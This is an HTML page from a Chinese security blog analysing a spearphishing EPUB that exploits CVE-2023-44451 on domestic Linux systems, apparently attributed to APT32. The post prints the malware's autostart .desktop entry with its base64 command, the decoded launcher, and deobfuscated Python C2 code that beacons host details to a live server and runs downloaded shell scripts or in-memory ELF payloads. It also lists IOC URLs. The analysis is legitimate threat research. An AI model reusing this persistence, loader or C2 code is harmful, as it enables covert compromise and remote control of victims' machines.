@@ -1,0 +1,738 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Demo">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="邮件附件，邮件内容敏感（略）  利用CVE-2023-44451，详见https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;CVE-2023-44451 利用工具及EXPhttps:&#x2F;&#x2F;github.com&#x2F;febinrev&#x2F;slippy-book-exploit 样本分析以第一个epub文件为例 利用漏洞创建文件：desktop-service-3752.desktop，构造路径..">
+<meta property="og:type" content="article">
+<meta property="og:title" content="针对我国信创系统的EPUB下载器">
+<meta property="og:url" content="http://wangchenchina.github.io/2025/07/14/%E9%92%88%E5%AF%B9%E6%88%91%E5%9B%BD%E4%BF%A1%E5%88%9B%E7%B3%BB%E7%BB%9F%E7%9A%84EPUB%E4%B8%8B%E8%BD%BD%E5%99%A8/index.html">
+<meta property="og:site_name" content="Demo_博客">
+<meta property="og:description" content="邮件附件，邮件内容敏感（略）  利用CVE-2023-44451，详见https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;CVE-2023-44451 利用工具及EXPhttps:&#x2F;&#x2F;github.com&#x2F;febinrev&#x2F;slippy-book-exploit 样本分析以第一个epub文件为例 利用漏洞创建文件：desktop-service-3752.desktop，构造路径..">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://wangchenchina.github.io/2025/07/14/%E9%92%88%E5%AF%B9%E6%88%91%E5%9B%BD%E4%BF%A1%E5%88%9B%E7%B3%BB%E7%BB%9F%E7%9A%84EPUB%E4%B8%8B%E8%BD%BD%E5%99%A8/image-20250714163526212.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2025/07/14/%E9%92%88%E5%AF%B9%E6%88%91%E5%9B%BD%E4%BF%A1%E5%88%9B%E7%B3%BB%E7%BB%9F%E7%9A%84EPUB%E4%B8%8B%E8%BD%BD%E5%99%A8/image-20250714170007886.png">
+<meta property="article:published_time" content="2025-07-14T10:28:39.000Z">
+<meta property="article:modified_time" content="2025-07-14T10:29:52.330Z">
+<meta property="article:author" content="Demo">
+<meta property="article:tag" content="CVE-2023-44451">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://wangchenchina.github.io/2025/07/14/%E9%92%88%E5%AF%B9%E6%88%91%E5%9B%BD%E4%BF%A1%E5%88%9B%E7%B3%BB%E7%BB%9F%E7%9A%84EPUB%E4%B8%8B%E8%BD%BD%E5%99%A8/image-20250714163526212.png">
+  
+  
+  
+  <title>针对我国信创系统的EPUB下载器 - Demo_博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"wangchenchina.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Demo_博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/bbs/">
+                <i class="iconfont icon-notebook"></i>
+                留言板
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="针对我国信创系统的EPUB下载器"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-14 18:28" pubdate>
+          2025年7月14日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          39 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">针对我国信创系统的EPUB下载器</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>邮件附件，邮件内容敏感（略）</p>
+<p><img src="/2025/07/14/%E9%92%88%E5%AF%B9%E6%88%91%E5%9B%BD%E4%BF%A1%E5%88%9B%E7%B3%BB%E7%BB%9F%E7%9A%84EPUB%E4%B8%8B%E8%BD%BD%E5%99%A8/image-20250714163526212.png" srcset="/img/loading.gif" lazyload alt="image-20250714163526212"></p>
+<p>利用CVE-2023-44451，详见<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2023-44451">https://nvd.nist.gov/vuln/detail/CVE-2023-44451</a></p>
+<p>利用工具及EXP<a target="_blank" rel="noopener" href="https://github.com/febinrev/slippy-book-exploit">https://github.com/febinrev/slippy-book-exploit</a></p>
+<h5 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h5><p>以第一个epub文件为例</p>
+<p>利用漏洞创建文件：<strong>desktop-service-3752.desktop</strong>，构造路径..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;..&#x2F;.config&#x2F;autostart&#x2F;desktop-service-3752.desktop</p>
+<p>该路径下的.desktop文件可以实现开机自启动（持久化）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[Desktop Entry]<br>Encoding=UTF-8<br>Type=Application<br>Terminal=<span class="hljs-literal">false</span><br>Exec=bash -c <span class="hljs-string">&quot;echo &#x27;c2V0c3RhdHVzIC1mIGV4ZWN0bCBvZmYgJiYgcHl0aG9uMyAtYyAiaW1wb3J0IHpsaWIsc3lzO2V4ZWMoemxpYi5kZWNvbXByZXNzKG9wZW4oc3lzLmFyZ3ZbMV0sJ3JiJykucmVhZCgpKS5kZWNvZGUoJ3V0Zi04JykpIiAuLy5jb25maWcvLkJPRFBmWjVKY0k3cSAzNzUyIHx8IHsgWyAkPyAtZXEgMiBdICYmIHB5dGhvbjMgLWMgImltcG9ydCB6bGliLHN5cztleGVjKHpsaWIuZGVjb21wcmVzcyhvcGVuKHN5cy5hcmd2WzFdLCdyYicpLnJlYWQoKSkuZGVjb2RlKCd1dGYtOCcpKSIgLi8uY29uZmlnLy5CT0RQZlo1SmNJN3EgMzc1MiA7fQ==&#x27; | base64 -d | bash &quot;</span> <br>Name=dmvsvZj<br></code></pre></td></tr></table></figure>
+
+<p>base64解码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setstatus -f exectl off &amp;&amp; python3 -c <span class="hljs-string">&quot;import zlib,sys;exec(zlib.decompress(open(sys.argv[1],&#x27;rb&#x27;).read()).decode(&#x27;utf-8&#x27;))&quot;</span> ./.config/.BODPfZ5JcI7q 3752 || &#123; [ $? -eq 2 ] &amp;&amp; python3 -c <span class="hljs-string">&quot;import zlib,sys;exec(zlib.decompress(open(sys.argv[1],&#x27;rb&#x27;).read()).decode(&#x27;utf-8&#x27;))&quot;</span> ./.config/.BODPfZ5JcI7q 3752 ;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>.BODPfZ5JcI7q</strong>文件是一段被压缩过的python脚本，解压后混淆严重，如下图</p>
+<p><img src="/2025/07/14/%E9%92%88%E5%AF%B9%E6%88%91%E5%9B%BD%E4%BF%A1%E5%88%9B%E7%B3%BB%E7%BB%9F%E7%9A%84EPUB%E4%B8%8B%E8%BD%BD%E5%99%A8/image-20250714170007886.png" srcset="/img/loading.gif" lazyload alt="image-20250714170007886"></p>
+<p>去混淆后得到部分主体代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python">bot_id = <span class="hljs-number">823701</span><br>server_url = <span class="hljs-string">&#x27;https://einstiensinc.org/results/aat/694986b8e74a&#x27;</span>  <span class="hljs-comment"># C2服务器URL</span><br>encryption_key = <span class="hljs-string">&#x27;Ywo992mchjuuwns@&#x27;</span>  <span class="hljs-comment"># 加密密钥</span><br>user_agent = <span class="hljs-string">&#x27;Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108&#x27;</span>  <span class="hljs-comment"># User-Agent</span><br><span class="hljs-comment"># 使用XOR和SHA256生成最终的加密密钥</span><br>key = xor_string_with_key(encryption_key, bot_id)<br>aes_key = hashlib.sha256(<span class="hljs-built_in">str</span>(encryption_key).encode()).digest()[:(<span class="hljs-number">16</span>)]  <span class="hljs-comment"># 取前16字节作为AES密钥</span><br>first_run = <span class="hljs-number">1</span>  <span class="hljs-comment"># 首次运行标志</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>): <br>    <span class="hljs-keyword">if</span> first_run == (<span class="hljs-number">0</span>):<br>        <span class="hljs-comment"># 首次运行后，随机延迟(600 * 77~123%)秒</span><br>        time.sleep((<span class="hljs-number">600</span>) * random.uniform(<span class="hljs-number">77</span>, <span class="hljs-number">123</span>) / (<span class="hljs-number">100</span>))<br>    first_run = <span class="hljs-number">0</span>  <span class="hljs-comment"># 设置为非首次运行     </span><br>    <span class="hljs-comment"># 获取并加密系统信息</span><br>    encrypted_info = get_system_info(aes_key, key)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 向C2服务器发送POST请求</span><br>        response = requests.post(<br>            server_url,<br>            headers=&#123;<br>                <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(user_agent),<br>                <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;id=&#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(bot_id + (<span class="hljs-number">9999</span>)),<br>                <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span><br>            &#125;,<br>            data=encrypted_info,<br>            verify=(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 不验证SSL证书</span><br>        )<br>        <span class="hljs-comment"># 如果响应无效，继续循环</span><br>        <span class="hljs-keyword">if</span> response.status_code != (<span class="hljs-number">200</span>) <span class="hljs-keyword">or</span> response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] != <span class="hljs-string">&#x27;application/octet-stream&#x27;</span> <span class="hljs-keyword">or</span> response.content == <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 解密服务器响应内容</span><br>            decrypted_content = decrypt_data(response.content, aes_key, key)<br>    <span class="hljs-keyword">except</span> RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">continue</span>  <span class="hljs-comment"># 网络请求异常，继续循环 </span><br>    <span class="hljs-comment"># 分叉进程</span><br>    child_pid = os.fork()<br>    <span class="hljs-keyword">if</span> child_pid != (<span class="hljs-number">0</span>):  <span class="hljs-comment"># 父进程</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-comment"># 子进程处理下载的ELF文件</span><br>    <span class="hljs-keyword">if</span> decrypted_content.startswith(<span class="hljs-string">b&#x27;#!&#x27;</span>):<br>        <span class="hljs-comment"># 如果是shell脚本，直接执行</span><br>        subprocess.run(decrypted_content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), shell=(<span class="hljs-number">1</span>), executable=<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 定义不同架构对应的系统调用号</span><br>        machine_types = &#123;<br>            **<span class="hljs-built_in">dict</span>.fromkeys([<span class="hljs-string">&#x27;autodetect&#x27;</span>, <span class="hljs-string">&#x27;libc&#x27;</span>], -((<span class="hljs-number">1</span>)),<br>            **<span class="hljs-built_in">dict</span>.fromkeys([<span class="hljs-string">&#x27;386&#x27;</span>, (<span class="hljs-number">3</span>)], (<span class="hljs-number">356</span>)),<br>            **<span class="hljs-built_in">dict</span>.fromkeys([<span class="hljs-string">&#x27;amd64&#x27;</span>, (<span class="hljs-number">62</span>)], (<span class="hljs-number">319</span>)),<br>            **<span class="hljs-built_in">dict</span>.fromkeys([<span class="hljs-string">&#x27;arm&#x27;</span>, (<span class="hljs-number">40</span>)], (<span class="hljs-number">385</span>)),<br>            **<span class="hljs-built_in">dict</span>.fromkeys([<span class="hljs-string">&#x27;arm64&#x27;</span>, <span class="hljs-string">&#x27;riscv64&#x27;</span>, (<span class="hljs-number">183</span>)], (<span class="hljs-number">279</span>)),<br>            **<span class="hljs-built_in">dict</span>.fromkeys([<span class="hljs-string">&#x27;mips&#x27;</span>, (<span class="hljs-number">8</span>)], (<span class="hljs-number">4354</span>)),<br>            **<span class="hljs-built_in">dict</span>.fromkeys([<span class="hljs-string">&#x27;mips64&#x27;</span>, <span class="hljs-string">&#x27;mips64le&#x27;</span>, (<span class="hljs-number">8</span>)], (<span class="hljs-number">5314</span>)),<br>            **<span class="hljs-built_in">dict</span>.fromkeys([<span class="hljs-string">&#x27;ppc&#x27;</span>, <span class="hljs-string">&#x27;ppc64&#x27;</span>, (<span class="hljs-number">20</span>)], (<span class="hljs-number">360</span>)),<br>            **<span class="hljs-built_in">dict</span>.fromkeys([<span class="hljs-string">&#x27;s390x&#x27;</span>, (<span class="hljs-number">22</span>)], (<span class="hljs-number">350</span>)),<br>            **<span class="hljs-built_in">dict</span>.fromkeys([<span class="hljs-string">&#x27;sparc64&#x27;</span>, (<span class="hljs-number">2</span>), (<span class="hljs-number">18</span>), (<span class="hljs-number">43</span>)], (<span class="hljs-number">348</span>)))<br>        &#125;<br>        <span class="hljs-comment"># 解析ELF文件头获取机器类型</span><br>        elf_machine_type = parse_elf_header(decrypted_content[:(<span class="hljs-number">20</span>)])<br>        <br>        <span class="hljs-comment"># 获取对应的系统调用号</span><br>        <span class="hljs-keyword">if</span> elf_machine_type !=<span class="hljs-string">&#x27;libc&#x27;</span>:<br>            syscall_number = machine_types.get(elf_machine_type)<br>        <span class="hljs-keyword">else</span>:<br>            syscall_number = <span class="hljs-literal">None</span><br>        <span class="hljs-comment"># 构建内存加载器代码</span><br>        loader_code = <span class="hljs-string">&#x27; &#x27;</span><br>        loader_code = prepare_loader_code(loader_code, syscall_number)<br>        loader_code = add_decompression_code(loader_code, decrypted_content)<br>        loader_code = add_write_code(loader_code, syscall_number)<br>        loader_code = build_execution_command(loader_code, server_url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-(<span class="hljs-number">1</span>)])<br>        <span class="hljs-comment"># 执行加载器代码，将ELF文件载入内存并执行</span><br>        <span class="hljs-built_in">exec</span>(loader_code)<br>    sys.exit((<span class="hljs-number">0</span>))  <span class="hljs-comment"># 子进程退出</span><br></code></pre></td></tr></table></figure>
+
+<p>主要功能包括：</p>
+<ul>
+<li>持久化</li>
+<li>收集受害主机信息（包括主机名、用户名、操作系统版本等）上传</li>
+<li>接收shell和根据架构内存加载ELF载荷</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">方法</th>
+<th align="center">收集的信息</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">socket.gethostname()</td>
+<td align="center">主机名</td>
+</tr>
+<tr>
+<td align="center">getpass.getuser()</td>
+<td align="center">当前用户名</td>
+</tr>
+<tr>
+<td align="center">platform.release()</td>
+<td align="center">操作系统版本</td>
+</tr>
+<tr>
+<td align="center">platform.version()</td>
+<td align="center">系统详细版本</td>
+</tr>
+<tr>
+<td align="center">platform.machine()</td>
+<td align="center">机器硬件架构</td>
+</tr>
+<tr>
+<td align="center">platform.libc_ver()</td>
+<td align="center">C标准库（libc）版本</td>
+</tr>
+</tbody></table>
+<h5 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h5><p>htt^p:&#x2F;&#x2F;149.62.44.233&#x2F;controllers&#x2F;others&#x2F;e-book&#x2F;any</p>
+<p>htt^p:&#x2F;&#x2F;64.176.185.77&#x2F;controllers&#x2F;acq&#x2F;demo&#x2F;1</p>
+<p>http^s:&#x2F;&#x2F;einstiensinc.org&#x2F;results&#x2F;aat&#x2F;694986b8e74a</p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>鱼叉式邮件攻击，邮件内容极具诱惑性，针对我敏感政府部门，针对信创操作系统。疑似APT组织攻击，内部怀疑为APT32。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" class="category-chain-item">样本分析</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CVE-2023-44451/">#CVE-2023-44451</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>针对我国信创系统的EPUB下载器</div>
+      <div>http://wangchenchina.github.io/2025/07/14/针对我国信创系统的EPUB下载器/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Demo</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/03/HellCat%E5%8B%92%E7%B4%A2%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" title="HellCat勒索样本分析">
+                        <span class="hidden-mobile">HellCat勒索样本分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"p4y64BT0Xe4gNN6V3D3J31XG-gzGzoHsz","appKey":"gaaGO0djz3T4tJHrM9kjHYMx","path":"window.location.pathname","placeholder":"随便说点什么吧~兄弟","avatar":"retro","meta":["nick"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <i class="iconfont icon-github-fill"></i> <a href="https://github.com/wangchenChina" target="_blank" rel="nofollow noopener"><span>Github</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
